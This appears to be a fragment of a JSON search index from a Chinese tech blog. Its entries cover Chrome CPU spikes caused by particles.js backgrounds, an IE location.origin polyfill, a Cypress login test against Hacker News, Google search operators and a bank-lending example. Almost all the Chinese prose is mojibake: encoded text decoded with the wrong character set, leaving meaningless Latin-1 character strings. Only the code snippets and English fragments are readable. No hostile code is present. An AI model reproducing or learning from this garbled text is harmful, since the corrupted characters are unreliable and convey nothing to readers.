CPUä¹Ÿæ˜¯ä¼šåœ¨é¦–é¡µé£™å‡åˆ°50%ã€‚\næ‰€è°“ï¼šå¼ºæ‹›å¿…è‡ªæŸï¼ŒåŠ¨æ€èƒŒæ™¯å›¾åœ¨ç»™äººä»¥ç‚«é…·ç§‘æŠ€æ„Ÿçš„åŒæ—¶ï¼Œä¹Ÿéœ€è¦æƒè¡¡è¿™ç§æŠ€æœ¯å¯¹å®¢æˆ·è®¡ç®—æœºçš„å‹åŠ›ã€‚\nå¦å¤–ï¼Œä¸è¦å°çœ‹JavaScript, å®ƒä¹Ÿå¯èƒ½å¼•èµ·å¤§é—®é¢˜\n","permalink":"https://wdd.js.org/posts/2018/06/how-to-fix-google-chrome-very-high-cpu-cost/","summary":"1. é—®é¢˜ç°è±¡ æœ‰æ—¶å€™å‘ç°macé£æ‰‡å“çš„å‰å®³ï¼Œäºæ˜¯æˆ‘æ£€æŸ¥äº†macç³»ç»Ÿçš„æ´»åŠ¨ç›‘è§†å™¨ï¼Œå‘ç°Google Chrome Helperå ç”¨99%çš„CPUã€‚\né€šå¸¸æ¥è¯´Chromeå¦‚æœå ç”¨è¿‡é«˜çš„å†…å­˜ï¼Œè¿™å¹¶ä¸æ˜¯ä»€ä¹ˆé—®é¢˜ï¼Œæ¯•ç«ŸChromeçš„æ€§èƒ½ä»¥åŠæ˜“ç”¨æ€§æ˜¯å»ºç«‹åœ¨å ç”¨å¾ˆå¤šå†…å­˜çš„åŸºç¡€ä¸Šçš„ã€‚ä½†æ˜¯æ— è®ºä»€ä¹ˆç¨‹åºï¼ŒæŒç»­çš„å ç”¨è¶…è¿‡80%çš„cpuï¼Œéƒ½æ˜¯æä¸æ­£å¸¸çš„ã€‚å¤§å¤šæ•°ç¨‹åºéƒ½æ˜¯å ç”¨ç»´æŒåœ¨ä½äº10%çš„CPUã€‚\næ´»åŠ¨ç›‘è§†å™¨æŒ‡å‡ºé—®é¢˜å‡ºç°åœ¨Chromeæµè§ˆå™¨ã€‚é‚£ä¹ˆé—®é¢˜å¯ä»¥å†æ¬¡ç»†åˆ†ä¸ºä¸‰å—ã€‚\nChromeç³»ç»Ÿè‡ªèº«é—®é¢˜ ä¸€äº›æ’ä»¶ï¼Œä¾‹å¦‚flashæ’ä»¶ï¼Œæ‰©å±•æ’ä»¶ ç½‘é¡µç¨‹åºjså‡ºç°çš„é—®é¢˜ 2. ä»ä»»åŠ¡ç®¡ç†å™¨ç€æ‰‹ å…¶å®Chromeæµè§ˆå™¨è‡ªèº«ä¹Ÿæ˜¯æœ‰ä»»åŠ¡ç®¡ç†å™¨çš„ï¼Œä¸€èˆ¬æ¥è¯´windowsç‰ˆchromeæŒ‰ä½shift+escå°±ä¼šè°ƒå‡ºä»»åŠ¡ç®¡ç†å™¨çª—å£ã€‚macç‰ˆè°ƒå‡ºä»»åŠ¡ç®¡ç†å™¨æ²¡æœ‰å¿«æ·ï¼Œåªèƒ½é€šè¿‡Window \u0026gt; Task Managerè°ƒå‡ºã€‚\nè°ƒå‡ºä»»åŠ¡ç®¡ç†å™¨åï¼Œå‘ç°ä¸€ä¸ªæ ‡ç­¾é¡µï¼ŒCPUå ç”¨ç‡è¾¾åˆ°99%ï¼Œ é‚£å°±è¯´æ˜ï¼Œåº”è¯¥æ˜¯è¿™ä¸ªæ ‡ç­¾é¡µä¸­å­˜åœ¨æŒç»­å ç”¨å¤§é‡CPUè®¡ç®—çš„ç¨‹åºã€‚\næœ€åæ‰¾åˆ°è¿™ä¸ªé¡µé¢ï¼Œå‘ç°è¯¥é¡µé¢èƒŒæ™¯å›¾æ˜¯ä¸€ç§åŠ¨æ€ç²’å­å›¾ã€‚å°±æ˜¯åŸºäºparticles.jsåšçš„ã€‚æˆ‘æƒ³ï¼Œç»ˆäºæ‰¾åˆ°ä½ äº†ã€‚\näºæ˜¯æˆ‘æŠŠè¿™ä¸ªåŠ¨æ€å›¾çš„ç›¸å…³jsä»£ç ç»™æ³¨é‡Šæ‰ï¼Œç”µè„‘çš„é£æ‰‡ä¹Ÿç»ˆäºå˜å¾—å®‰é™äº†ã€‚\n3. é—®é¢˜æ€»ç»“ é—®é¢˜è§£å†³çš„æ€»ç»“ï¼šè§£å†³é—®é¢˜çš„æ–¹æ³•æ—¶å¾ˆç®€å•çš„ï¼ŒåŸºäºä¸€ä¸ªç°è±¡ï¼Œæ‰¾åˆ°ä¸€ä¸ªåŸå› ï¼ŒåŸºäºè¿™ä¸ªåŸå› å†æ‰¾åˆ°ä¸€ä¸ªç°è±¡ï¼Œç„¶åä¸€æ­¥ä¸€æ­¥ç¼©å°é—®é¢˜èŒƒå›´ï¼Œé€¼è¿‘æœ€ç»ˆåŸå› ã€‚\næœºå™¨CPUè¿‡é«˜ï¼Œä¸€èˆ¬éƒ½æ˜¯å¯ä»¥ä»ä»»åŠ¡ç®¡ç†å™¨ç€æ‰‹è§£å†³ã€‚ç³»ç»Ÿçš„ä»»åŠ¡ç®¡ç†å™¨å¯ä»¥ç›‘æ§å„ä¸ªç¨‹åºå ç”¨çš„CPUæ˜¯å¦æ­£å¸¸ï¼Œé€šå¸¸ç¨‹åºè‡ªèº«ä¹Ÿæ˜¯æœ‰ä»»åŠ¡ç®¡ç†çš„ã€‚\nåƒè°·æ­Œæµè§ˆå™¨è¿™ç§è½¯ä»¶ï¼Œå‡ ä¹æœ¬èº«å°±æ˜¯ä¸€ä¸ªæ“ä½œç³»ç»Ÿï¼Œæ‰€ä»¥è¯´å®ƒçš„ä»»åŠ¡ç®¡ç†å™¨ä¹Ÿæ˜¯å¿…ä¸å¯å°‘çš„ã€‚Chromeæµè§ˆå™¨å†å¸¦çš„ä»»åŠ¡ç®¡ç†å™¨å¯ä»¥å‘Šè¯‰ä½ å‡ ä¸ªå…³é”®ä¿¡æ¯ã€‚\nä»»åŠ¡å ç”¨çš„å†…å­˜ ä»»åŠ¡å ç”¨çš„CPU ä»»åŠ¡å ç”¨çš„ç½‘ç»œæµé‡å¤§å° å¦‚æœä½ ä¸€æ‰“å¼€è°·æ­Œæµè§ˆå™¨ï¼Œä½ çš„ç”µè„‘é£æ‰‡å°±æ‹¼å‘½è½¬ï¼Œé‚£ä½ æœ€å¥½æ‰“å¼€è°·æ­Œæµè§ˆå™¨çš„ä»»åŠ¡ç®¡ç†å™¨çœ‹çœ‹ã€‚\n4. å…³äºåŠ¨æ€èƒŒæ™¯å›¾çš„æ€è€ƒ åŠ¨æ€èƒŒæ™¯å›¾å¾€å¾€éƒ½ä¼šç»™äººå¾ˆé…·ç‚«çš„æ„Ÿè§‰ï¼Œä½†æ˜¯è¿™ç§èƒŒæ™¯å›¾çš„åˆ¶ä½œå¹¶ä¸æ˜¯å¾ˆå¤æ‚ï¼Œå¦‚æœä½ ä½¿ç”¨particles.jsæ¥åˆ¶ä½œï¼Œåˆ¶ä½œä¸€äº›åŠ¨æ€èƒŒæ™¯å›¾åªéœ€è¦å‡ è¡Œä»£ç å°±å¯ä»¥æå®šã€‚ä½†æ˜¯è¿™ç§é…·ç‚«çš„èƒŒåï¼ŒCPUä¹Ÿåœ¨æ‰¿å—ç€å‹åŠ›ã€‚\nparticles.jsæä¾›çš„demoæ•ˆæœå›¾ï¼Œåœ¨Chromeä¸­CPUä¼šè¢«æé«˜åˆ°100%ã€‚\nä¹Ÿæœ‰å‡ å®¶ä½¿ç”¨åŠ¨æ€èƒŒæ™¯å›¾çš„å®˜ç½‘ã€‚æˆ‘è®°å¾—çŸ¥ä¹ä»¥å‰å°±ç”¨è¿‡åŠ¨æ€èƒŒæ™¯å›¾ï¼Œä½†æ˜¯ç°åœ¨æ‰¾ä¸åˆ°äº†ã€‚å¦å¤–ä¸€ä¸ªä½¿ç”¨åŠ¨æ€èƒŒæ™¯å›¾çš„æ˜¯daocloud, CPUä¹Ÿæ˜¯ä¼šåœ¨é¦–é¡µé£™å‡åˆ°50%ã€‚\næ‰€è°“ï¼šå¼ºæ‹›å¿…è‡ªæŸï¼ŒåŠ¨æ€èƒŒæ™¯å›¾åœ¨ç»™äººä»¥ç‚«é…·ç§‘æŠ€æ„Ÿçš„åŒæ—¶ï¼Œä¹Ÿéœ€è¦æƒè¡¡è¿™ç§æŠ€æœ¯å¯¹å®¢æˆ·è®¡ç®—æœºçš„å‹åŠ›ã€‚\nå¦å¤–ï¼Œä¸è¦å°çœ‹JavaScript, å®ƒä¹Ÿå¯èƒ½å¼•èµ·å¤§é—®é¢˜","title":"è®°ä¸€æ¬¡å¦‚ä½•è§£å†³è°·æ­Œæµè§ˆå™¨å ç”¨è¿‡é«˜cpué—®é¢˜è¿‡ç¨‹"},{"content":"æŸäº›IEæµè§ˆå™¨location.originå±æ€§æ˜¯undefinedï¼Œæ‰€ä»¥å¦‚æœä½ è¦ä½¿ç”¨è¯¥å±æ€§ï¼Œé‚£ä¹ˆè¦æ³¨æ„åšä¸ªèƒ½åŠ›æ£€æµ‹ã€‚\nif (!window.location.origin) { window.location.origin = window.location.protocol + \u0026#34;//\u0026#34; + window.location.hostname + (window.location.port ? \u0026#39;:\u0026#39; + window.location.port: \u0026#39;\u0026#39;); }i ","permalink":"https://wdd.js.org/posts/2018/05/ie-not-support-location-origin/","summary":"æŸäº›IEæµè§ˆå™¨location.originå±æ€§æ˜¯undefinedï¼Œæ‰€ä»¥å¦‚æœä½ è¦ä½¿ç”¨è¯¥å±æ€§ï¼Œé‚£ä¹ˆè¦æ³¨æ„åšä¸ªèƒ½åŠ›æ£€æµ‹ã€‚\nif (!window.location.origin) { window.location.origin = window.location.protocol + \u0026#34;//\u0026#34; + window.location.hostname + (window.location.port ? \u0026#39;:\u0026#39; + window.location.port: \u0026#39;\u0026#39;); }i ","title":"IEæµè§ˆå™¨ä¸æ”¯æŒlocation.origin"},{"content":"1. ç›®å‰E2Eæµ‹è¯•å·¥å…·æœ‰å“ªäº›ï¼Ÿ é¡¹ç›® Web Star puppeteer Chromium (~170Mb Mac, ~282Mb Linux, ~280Mb Win) 31906 nightmare Electron 15502 nightwatch WebDriver 8135 protractor selenium 7532 casperjs PhantomJS 7180 cypress Electron 5303 Zombie ä¸éœ€è¦ 4880 testcafe ä¸éœ€è¦ 4645 CodeceptJS webdriverio 1665 ç«¯åˆ°ç«¯æµ‹è¯•ä¸€èˆ¬éƒ½éœ€è¦ä¸€ä¸ªWebå®¹å™¨ï¼Œæ¥è¿è¡Œå‰ç«¯åº”ç”¨ã€‚ä¾‹å¦‚Chromium, Electron, PhantomJS, WebDriverç­‰ç­‰ã€‚\nä»ä½“ç§¯è§’åº¦è€ƒè™‘ï¼Œè¿™äº›Webå®¹å™¨ä½“ç§¯ä¸€èˆ¬éƒ½å¾ˆå¤§ã€‚\nä»é€Ÿåº¦çš„è§’åº¦è€ƒè™‘ï¼šPhantomJS, WebDriver \u0026lt; Electon, Chromiumã€‚\nè€Œä¸”æ¯ä¸ªå·¥å…·çš„ä¾§é‡ç‚¹ä¹Ÿä¸åŒï¼Œå»ºè®®æŒ‰ç…§éœ€è¦å»é€‰æ‹©ã€‚\n2. ä¼˜ç§€çš„ç«¯åˆ°ç«¯æµ‹è¯•å·¥å…·åº”è¯¥æœ‰å“ªäº›ç‰¹ç‚¹ï¼Ÿ å®‰è£…ç®€æ˜“ï¼šæˆ‘å¸Œæœ›å®ƒéå¸¸å®¹æ˜“å®‰è£…ï¼Œæœ€å¥½å¯ä»¥ä¸€è¡Œå‘½ä»¤å°±å¯ä»¥å®‰è£…å®Œæ¯• ä¾èµ–è¾ƒå°‘ï¼šæˆ‘åªæƒ³åšä¸ªE2Eæµ‹è¯•ï¼Œä¸æƒ³å®‰è£…jdk, pythonä¹‹ç±»çš„ä¸œè¥¿ é€Ÿåº¦å¾ˆå¿«ï¼šè¿è¡Œæµ‹è¯•ç”¨ä¾‹çš„é€Ÿåº¦è¦å¿« æŠ¥é”™è¯¦ç»†ï¼šè¯¦ç»†çš„æŠ¥é”™ APIå®Œå¤‡ï¼šé¼ æ ‡é”®ç›˜æ“ä½œæ¥å£ï¼ŒDOMæŸ¥è¯¢æ¥å£ç­‰ Debugæ–¹ä¾¿ï¼šå‡ºé”™äº†å¯ä»¥å¾ˆæ–¹ä¾¿çš„è°ƒè¯•ï¼Œè€Œä¸æ˜¯å»çŒœ 3. ä¸ºä»€ä¹ˆè¦ç”¨Cypressï¼Ÿ CypressåŸºæœ¬ä¸Šæ‹¥æœ‰äº†ä¸Šé¢çš„ç‰¹ç‚¹ä¹‹å¤–ï¼Œè¿˜æœ‰ä»¥ä¸‹ç‰¹ç‚¹ã€‚\næ—¶å…‰ç©¿æ¢­ æµ‹è¯•è¿è¡Œæ—¶ï¼ŒCypressä¼šè‡ªåŠ¨æˆªå›¾ï¼Œä½ å¯ä»¥è½»æ˜“çš„æŸ¥çœ‹æ¯ä¸ªæ—¶é—´çš„æˆªå›¾ Debugå‹å¥½ ä¸éœ€è¦å†å»çŒœæµ‹ä¸ºä»€ä¹ˆæµ‹è¯•æœ‰å¤±è´¥äº†ï¼ŒCypressæä¾›Chrome DevTools, æ‰€ä»¥Debugæ˜¯éå¸¸æ–¹ä¾¿çš„ã€‚ å®æ—¶åˆ·æ–° Cypressæ£€æµ‹æµ‹è¯•ç”¨ä¾‹æ”¹å˜åï¼Œä¼šè‡ªåŠ¨åˆ·æ–° è‡ªåŠ¨ç­‰å¾… ä¸éœ€è¦åœ¨ä½¿ç”¨waitç±»ä¼¼çš„æ–¹æ³•ç­‰å¾…æŸä¸ªDOMå‡ºç°ï¼ŒCypressä¼šè‡ªåŠ¨å¸®ä½ åšè¿™äº› Spies, stubs, and clocks Verify and control the behavior of functions, server responses, or timers. The same functionality you love from unit testing is right at your fingertips. ç½‘ç»œæµé‡æ§åˆ¶ åœ¨ä¸æ¶‰åŠæœåŠ¡å™¨çš„æƒ…å†µä¸‹è½»æ¾æ§åˆ¶ï¼Œå­˜æ ¹å’Œæµ‹è¯•è¾¹ç¼˜æ¡ˆä¾‹ã€‚æ— è®ºä½ å–œæ¬¢ï¼Œä½ éƒ½å¯ä»¥å­˜å‚¨ç½‘ç»œæµé‡ã€‚ ä¸€è‡´çš„ç»“æœ æˆ‘ä»¬çš„æ¶æ„ä¸ä½¿ç”¨Seleniumæˆ–WebDriverã€‚å‘å¿«é€Ÿï¼Œä¸€è‡´å’Œå¯é çš„æ— å‰¥è½æµ‹è¯•é—®å¥½ã€‚ æˆªå›¾å’Œè§†é¢‘ æŸ¥çœ‹å¤±è´¥æ—¶è‡ªåŠ¨æˆªå–çš„æˆªå›¾ï¼Œæˆ–æ— æ¡ä»¶è¿è¡Œæ—¶æ•´ä¸ªæµ‹è¯•å¥—ä»¶çš„è§†é¢‘ã€‚ 4. å®‰è£…cypress 4.1. ä½¿ç”¨npmæ–¹æ³•å®‰è£… æ³¨æ„è¿™ä¸ªæ–¹æ³•éœ€è¦ä¸‹è½½å‹ç¼©è¿‡Electron, æ‰€ä»¥å¯èƒ½ä¼šèŠ±è´¹å‡ åˆ†é’Ÿæ—¶é—´ï¼Œè¯·è€å¿ƒç­‰å¾…ã€‚\nnpm i cypress -D 4.2. ç›´æ¥ä¸‹è½½Cypresså®¢æˆ·ç«¯ ä½ å¯ä»¥æŠŠCypressæƒ³æƒ³æˆä¸€ä¸ªæµè§ˆå™¨ï¼Œå¯ä»¥å•ç‹¬æŠŠå®ƒä¸‹è½½ä¸‹æ¥ï¼Œå®‰è£…åˆ°ç”µè„‘ä¸Šï¼Œå½“åšä¸€ä¸ªå®¢æˆ·ç«¯è½¯ä»¶æ¥ç”¨ã€‚\næ‰“å¼€ä¹‹åå°±æ˜¯è¿™ä¸ªæ ·å­ï¼Œå¯ä»¥æ‰‹åŠ¨å»æ‰“å¼€é¡¹ç›®ï¼Œè¿è¡Œæµ‹è¯•ç”¨ä¾‹ã€‚\n5. åˆå§‹åŒ–Cypress Cypressåˆå§‹åŒ–ï¼Œä¼šåœ¨é¡¹ç›®æ ¹ç›®å½•è‡ªåŠ¨ç”Ÿæˆcypressæ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”é‡Œé¢æœ‰äº›æµ‹è¯•ç”¨ä¾‹æ¨¡æ¿ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„å­¦ä¹ ã€‚\nåˆå§‹åŒ–çš„æ–¹æ³•æœ‰ä¸¤ç§ã€‚\nå¦‚æœä½ ä¸‹è½½çš„å®¢æˆ·ç«¯ï¼Œé‚£ä¹ˆä½ ç”¨å®¢æˆ·ç«¯æ‰“å¼€é¡¹ç›®æ—¶ï¼Œå®ƒä¼šæ£€æµ‹é¡¹ç›®ç›®å½•ä¸‹æœ‰æ²¡æœ‰Cypressç›®å½•ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±è‡ªåŠ¨å¸®ä½ ç”Ÿæˆæ¨¡æ¿ã€‚\nå¦‚æœä½ ä½¿ç”¨npmå®‰è£…çš„Cypressï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤node_modules/.bin/cypress openå»åˆå§‹åŒ–\n6. ç¼–å†™æµ‹è¯•ç”¨ä¾‹ // hacker-news.js describe(\u0026#39;Hacker Newsç™»å½•æµ‹è¯•\u0026#39;, () =\u0026gt; { it(\u0026#39;ç™»å½•é¡µé¢\u0026#39;, () =\u0026gt; { cy.visit(\u0026#39;https://news.ycombinator.com/login?goto=news\u0026#39;) cy.get(\u0026#39;input[name=\u0026#34;acct\u0026#34;]\u0026#39;).eq(0).type(\u0026#39;test\u0026#39;) cy.get(\u0026#39;input[name=\u0026#34;pw\u0026#34;]\u0026#39;).eq(0).type(\u0026#39;123456\u0026#39;) cy.get(\u0026#39;input[value=\u0026#34;login\u0026#34;]\u0026#39;).click() cy.contains(\u0026#39;Bad login\u0026#39;) }) }) 7. æŸ¥çœ‹ç»“æœ æ‰“å¼€Cypresså®¢æˆ·ç«¯ï¼Œé€‰æ‹©è¦æµ‹è¯•é¡¹ç›®çš„æ ¹ç›®å½•ï¼Œç‚¹å‡»hacker-news.jsåï¼Œæµ‹è¯•ç”¨ä¾‹å°±ä¼šè‡ªåŠ¨è¿è¡Œ\nè¿è¡Œç»“æŸåï¼Œå·¦ä¾§æ ç›®é¼ æ ‡ç§»åŠ¨ä¸Šå»ï¼Œå³ä¾§æ éƒ½ä¼šæ˜¾ç¤ºå‡ºè¯¥æ­¥éª¤çš„æˆªå›¾ï¼Œæ‰€ä»¥å«åšæ—¶å…‰ç©¿æ¢­åŠŸèƒ½ã€‚\nä»æˆªå›¾ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼ŒCypressçš„æ­¥éª¤æè¿°å¾ˆè¯¦ç»†ã€‚\n","permalink":"https://wdd.js.org/posts/2018/05/e2e-testing-hacker-news-with-cypress/","summary":"1. ç›®å‰E2Eæµ‹è¯•å·¥å…·æœ‰å“ªäº›ï¼Ÿ é¡¹ç›® Web Star puppeteer Chromium (~170Mb Mac, ~282Mb Linux, ~280Mb Win) 31906 nightmare Electron 15502 nightwatch WebDriver 8135 protractor selenium 7532 casperjs PhantomJS 7180 cypress Electron 5303 Zombie ä¸éœ€è¦ 4880 testcafe ä¸éœ€è¦ 4645 CodeceptJS webdriverio 1665 ç«¯åˆ°ç«¯æµ‹è¯•ä¸€èˆ¬éƒ½éœ€è¦ä¸€ä¸ªWebå®¹å™¨ï¼Œæ¥è¿è¡Œå‰ç«¯åº”ç”¨ã€‚ä¾‹å¦‚Chromium, Electron, PhantomJS, WebDriverç­‰ç­‰ã€‚\nä»ä½“ç§¯è§’åº¦è€ƒè™‘ï¼Œè¿™äº›Webå®¹å™¨ä½“ç§¯ä¸€èˆ¬éƒ½å¾ˆå¤§ã€‚\nä»é€Ÿåº¦çš„è§’åº¦è€ƒè™‘ï¼šPhantomJS, WebDriver \u0026lt; Electon, Chromiumã€‚\nè€Œä¸”æ¯ä¸ªå·¥å…·çš„ä¾§é‡ç‚¹ä¹Ÿä¸åŒï¼Œå»ºè®®æŒ‰ç…§éœ€è¦å»é€‰æ‹©ã€‚\n2. ä¼˜ç§€çš„ç«¯åˆ°ç«¯æµ‹è¯•å·¥å…·åº”è¯¥æœ‰å“ªäº›ç‰¹ç‚¹ï¼Ÿ å®‰è£…ç®€æ˜“ï¼šæˆ‘å¸Œæœ›å®ƒéå¸¸å®¹æ˜“å®‰è£…ï¼Œæœ€å¥½å¯ä»¥ä¸€è¡Œå‘½ä»¤å°±å¯ä»¥å®‰è£…å®Œæ¯• ä¾èµ–è¾ƒå°‘ï¼šæˆ‘åªæƒ³åšä¸ªE2Eæµ‹è¯•ï¼Œä¸æƒ³å®‰è£…jdk, pythonä¹‹ç±»çš„ä¸œè¥¿ é€Ÿåº¦å¾ˆå¿«ï¼šè¿è¡Œæµ‹è¯•ç”¨ä¾‹çš„é€Ÿåº¦è¦å¿« æŠ¥é”™è¯¦ç»†ï¼šè¯¦ç»†çš„æŠ¥é”™ APIå®Œå¤‡ï¼šé¼ æ ‡é”®ç›˜æ“ä½œæ¥å£ï¼ŒDOMæŸ¥è¯¢æ¥å£ç­‰ Debugæ–¹ä¾¿ï¼šå‡ºé”™äº†å¯ä»¥å¾ˆæ–¹ä¾¿çš„è°ƒè¯•ï¼Œè€Œä¸æ˜¯å»çŒœ 3. ä¸ºä»€ä¹ˆè¦ç”¨Cypressï¼Ÿ CypressåŸºæœ¬ä¸Šæ‹¥æœ‰äº†ä¸Šé¢çš„ç‰¹ç‚¹ä¹‹å¤–ï¼Œè¿˜æœ‰ä»¥ä¸‹ç‰¹ç‚¹ã€‚\næ—¶å…‰ç©¿æ¢­ æµ‹è¯•è¿è¡Œæ—¶ï¼ŒCypressä¼šè‡ªåŠ¨æˆªå›¾ï¼Œä½ å¯ä»¥è½»æ˜“çš„æŸ¥çœ‹æ¯ä¸ªæ—¶é—´çš„æˆªå›¾ Debugå‹å¥½ ä¸éœ€è¦å†å»çŒœæµ‹ä¸ºä»€ä¹ˆæµ‹è¯•æœ‰å¤±è´¥äº†ï¼ŒCypressæä¾›Chrome DevTools, æ‰€ä»¥Debugæ˜¯éå¸¸æ–¹ä¾¿çš„ã€‚ å®æ—¶åˆ·æ–° Cypressæ£€æµ‹æµ‹è¯•ç”¨ä¾‹æ”¹å˜åï¼Œä¼šè‡ªåŠ¨åˆ·æ–° è‡ªåŠ¨ç­‰å¾… ä¸éœ€è¦åœ¨ä½¿ç”¨waitç±»ä¼¼çš„æ–¹æ³•ç­‰å¾…æŸä¸ªDOMå‡ºç°ï¼ŒCypressä¼šè‡ªåŠ¨å¸®ä½ åšè¿™äº› Spies, stubs, and clocks Verify and control the behavior of functions, server responses, or timers.","title":"ç«¯åˆ°ç«¯æµ‹è¯•å“ªå®¶å¼ºï¼Ÿä¸å®¹é”™è¿‡çš„Cypress"},{"content":" 1. è°·æ­Œæœç´¢æŒ‡ä»¤ 2. åŸºæœ¬å‘½ä»¤ 3. å…³é”®è¯ä½¿ç”¨ 4. ç‰¹æ®Šå·¥å…· 4.1. define å¿«é€Ÿè¿”å›å…³é”®è¯å®šä¹‰ 4.2. è®¡ç®—å™¨ 4.3. å•ä½è½¬æ¢ 4.4. æ—¶åŒºæŸ¥è¯¢ 4.5. åœ°åŒºæŸ¥è¯¢ 4.6. å¤©æ°”æŸ¥è¯¢ 5. å‚è€ƒ 1. è°·æ­Œæœç´¢æŒ‡ä»¤ 2. åŸºæœ¬å‘½ä»¤ ç¬¦å· ç®€ä»‹ è¯­æ³• æ³¨æ„ç‚¹ ç¤ºä¾‹ | åŒ…å«Aä¸”å¿…é¡»åŒ…å«B | A +B | Aå’Œ+ä¹‹é—´æœ‰ç©ºæ ¼ | Maxwell +wills | åŒ…å«Aä¸”ä¸åŒ…å«B | A -B | Aå’Œ+ä¹‹é—´æœ‰ç©ºæ ¼ | Maxwell -Absolom \u0026quot; \u0026quot; | å®Œæ•´åŒ¹é…AB | \u0026ldquo;AB\u0026rdquo; | | \u0026ldquo;Thomas Jefferson\u0026rdquo; OR | åŒ…å«Aæˆ–è€…B | A OR B æˆ–è€… A | B | | nodejs OR webpack +-\u0026ldquo;OR | æŒ‡ä»¤å¯ä»¥ç»„åˆï¼Œå®Œæˆæ›´å¤æ‚çš„æŸ¥è¯¢ | | | beach -sandy +albert +nathaniel ~ | åŒ…å«A, å¹¶ä¸”åŒ…å«Bçš„è¿‘ä¹‰è¯ | A ~B | | github ~js .. | åŒºé—´æŸ¥è¯¢ ABä¹‹é—´ | A..B | | china 1888..2000 | åŒ¹é…ä»»æ„å­—ç¬¦ | | | node* java site: | ç«™å†…æœç´¢ | A site:B | | | DLL site:webpack.js.org filetype: | æŒ‰ç…§æ–‡ä»¶ç±»å‹æœç´¢ | A filetype:B | | csta filetype:pdf 3. å…³é”®è¯ä½¿ç”¨ æ–¹æ³• è¯´æ˜ ç¤ºä¾‹ åˆ—ä¸¾å…³é”®è¯ åˆ—ä¸¾æ‰€æœ‰å’Œæœç´¢ç›¸å…³çš„å…³é”®è¯ï¼Œå¹¶ä¸”å°½é‡æŠŠé‡è¦çš„å…³é”®è¯æ’åœ¨å‰é¢ã€‚ä¸åŒçš„å…³é”®è¯é¡ºåºä¼šå¯¼è‡´ä¸åŒçš„è¿”å›ä¸åŒçš„ç»“æœ ä¹¦æ³• æ¯›ç¬” ç»˜ç”» ä¸è¦ä½¿ç”¨æŸäº›è¯ å¦‚ä»£è¯ä»‹è¯è¯­æ°”è¯ï¼Œå¦‚i, the, of, it, æˆ‘ï¼Œå— æœç´¢å¼•æ“ä¸€èˆ¬ä¼šç›´æ¥å¿½ç•¥è¿™äº›ä¿¡æ¯å«é‡å°‘çš„è¯ å¤§å°å†™ä¸æ•æ„Ÿ å¤§å†™å­—ç¬¦å’Œå°å†™å­—ç¬¦åœ¨æœç´¢å¼•æ“çœ‹æ²¡æœ‰åŒºåˆ«ï¼Œå°½é‡ä½¿ç”¨å°å†™çš„å°±å¯ä»¥ 4. ç‰¹æ®Šå·¥å…· 4.1. define å¿«é€Ÿè¿”å›å…³é”®è¯å®šä¹‰ 4.2. è®¡ç®—å™¨ 4.3. å•ä½è½¬æ¢ 4.4. æ—¶åŒºæŸ¥è¯¢ 4.5. åœ°åŒºæŸ¥è¯¢ 4.6. å¤©æ°”æŸ¥è¯¢ 5. å‚è€ƒ Advanced Google Search Commands Google_rules_for_searching.pdf An introduction to search commands ","permalink":"https://wdd.js.org/posts/2018/04/master-google-search-command/","summary":"1. è°·æ­Œæœç´¢æŒ‡ä»¤ 2. åŸºæœ¬å‘½ä»¤ 3. å…³é”®è¯ä½¿ç”¨ 4. ç‰¹æ®Šå·¥å…· 4.1. define å¿«é€Ÿè¿”å›å…³é”®è¯å®šä¹‰ 4.2. è®¡ç®—å™¨ 4.3. å•ä½è½¬æ¢ 4.4. æ—¶åŒºæŸ¥è¯¢ 4.5. åœ°åŒºæŸ¥è¯¢ 4.6. å¤©æ°”æŸ¥è¯¢ 5. å‚è€ƒ 1. è°·æ­Œæœç´¢æŒ‡ä»¤ 2. åŸºæœ¬å‘½ä»¤ ç¬¦å· ç®€ä»‹ è¯­æ³• æ³¨æ„ç‚¹ ç¤ºä¾‹ | åŒ…å«Aä¸”å¿…é¡»åŒ…å«B | A +B | Aå’Œ+ä¹‹é—´æœ‰ç©ºæ ¼ | Maxwell +wills | åŒ…å«Aä¸”ä¸åŒ…å«B | A -B | Aå’Œ+ä¹‹é—´æœ‰ç©ºæ ¼ | Maxwell -Absolom \u0026quot; \u0026quot; | å®Œæ•´åŒ¹é…AB | \u0026ldquo;AB\u0026rdquo; | | \u0026ldquo;Thomas Jefferson\u0026rdquo; OR | åŒ…å«Aæˆ–è€…B | A OR B æˆ–è€… A | B | | nodejs OR webpack +-\u0026ldquo;OR | æŒ‡ä»¤å¯ä»¥ç»„åˆï¼Œå®Œæˆæ›´å¤æ‚çš„æŸ¥è¯¢ | | | beach -sandy +albert +nathaniel ~ | åŒ…å«A, å¹¶ä¸”åŒ…å«Bçš„è¿‘ä¹‰è¯ | A ~B | | github ~js .","title":"æŒæ¡è°·æ­Œæœç´¢é«˜çº§æŒ‡ä»¤"},{"content":"1. è§’è‰²åˆ’åˆ† åç§° è§’è‰² è´¦æˆ· A é“¶è¡Œå®¶ 0 B å»ºç­‘å•† 100ä¸‡ C å•†äºº 0 2. å»ºç­‘å•†å‘é“¶è¡Œå­˜å‚¨100ä¸‡ åç§° è§’è‰² è´¦æˆ· A é“¶è¡Œå®¶ 100ä¸‡ ç°é‡‘ B å»ºç­‘å•† 100ä¸‡ æ”¯ç¥¨ C å•†äºº 0 2. å•†äººå‘é“¶è¡Œè´·æ¬¾100ä¸‡ æ­¤æ—¶é“¶è¡Œçš„è´¦æˆ·å­˜æ¬¾å·²ç»æ˜¯0äº†ï¼Œä½†æ˜¯Bè¿˜åœ¨é“¶è¡Œå­˜äº†100ä¸‡ã€‚é‚£é“¶è¡Œç©¶ç«Ÿæ˜¯è¿˜æœ‰100ä¸‡å‘¢, è¿˜æ˜¯ä¸€æ¯›éƒ½æ²¡æœ‰äº†å‘¢ã€‚\næ­¤æ—¶å»ºç­‘å•†å¦‚æœè¦å–ç°é‡‘ï¼Œé‚£ä¹ˆé“¶è¡Œé©¬ä¸Šå°±è¦ç ´äº§ã€‚\nåç§° è§’è‰² è´¦æˆ· A é“¶è¡Œå®¶ 100ç°é‡‘ B å»ºç­‘å•† 100ä¸‡ æ”¯ç¥¨ C å•†äºº 100ä¸‡ æ”¯ç¥¨ 3. å•†äººéœ€è¦å»ºç­‘å•†æ¥å»ºé€ æˆ¿å­ 